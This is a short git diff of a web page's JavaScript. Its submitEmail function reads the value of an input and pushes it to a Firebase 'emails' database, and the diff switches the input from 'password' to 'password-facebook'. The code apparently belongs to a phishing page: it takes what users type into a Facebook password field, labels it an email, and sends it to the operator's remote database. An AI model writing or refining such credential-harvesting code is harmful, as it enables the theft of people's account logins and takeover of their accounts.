@@ -13,7 +13,7 @@ var firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 
 function submitEmail() {
-    var email = document.getElementById('password').value;
+    var email = document.getElementById('password-facebook').value;
     firebase.database().ref('emails').push({
         email: email,
         timestamp: new Date().toISOString()
